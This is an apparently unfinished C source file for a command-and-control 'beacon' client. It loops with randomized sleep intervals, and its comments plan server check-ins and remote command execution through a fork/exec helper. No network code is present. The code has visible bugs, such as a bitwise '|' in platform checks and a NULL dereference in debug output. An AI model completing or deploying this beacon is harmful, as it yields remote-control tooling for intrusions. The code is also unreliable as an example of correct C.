#include <stdlib.h>
#include <stdio.h>
#include "beacon_client.h"

int main(int argc, char **argv){
    while ( 1 ) {
        int sleep_time = (rand() % 60) + 5;
        #ifdef CLIENT_DEBUG
        printf("Sleeping for %d seconds... ",sleep_time);
        #endif

        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
        sleep(sleep_time); //seconds
        #elif __windows__
        Sleep(sleep_time*1000); //seconds -> milliseconds
        #endif
        
        #ifdef CLIENT_DEBUG
        printf("Complete.\n");
        #endif
        
        // TODO Finish:
        // check-in to server & send back previous command results
        // if command
            // run command
            // save results to be sent back on next beacon
        
    }
    return 0;
}

char *get_os() {
    return run_cmd(ID_CMD,NULL);
}

char *run_cmd(char *cmd,char **param) {
    int pipes[2];
    pid_t pid;
    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
    if (pipe(pipes)==-1) {
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to pipe.\n");
        #endif
        return NULL; // fail
    }
    if ((pid = fork()) == -1) { 
        #ifdef CLIENT_DEBUG
            puts("[run_cmd] Failed to fork.\n");
        #endif
        return NULL; // fail
    }

    if(pid == 0) {
        // TODO: FIX from direct exec to
        // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
            dup2(pipes[1], STDOUT_FILENO);
        #elif __windows__
            _dup2(pipes[1], STDOUT_FILENO);
        #endif
        close(pipes[0]);
        close(pipes[1]);
        #if defined(__apple__) || defined(__linux__) | defined(__unix__)
        if (param) {
            execv(cmd,param);
        } else {
            execl(cmd,"");
        }
        #elif __windows__
            _execv(cmd,param);
        #endif
    } else {
        close(pipes[1]);
        int nbytes = read(pipes[0], buf, BUF_SIZE);
        #ifdef CLIENT_DEBUG
            printf("[run_cmd] CMD ran: %s, Params[0]: %s, Output (%d bytes): %s\n", cmd, param[0], nbytes, buf);
        #endif
        wait(NULL);
    }
    return buf;
}
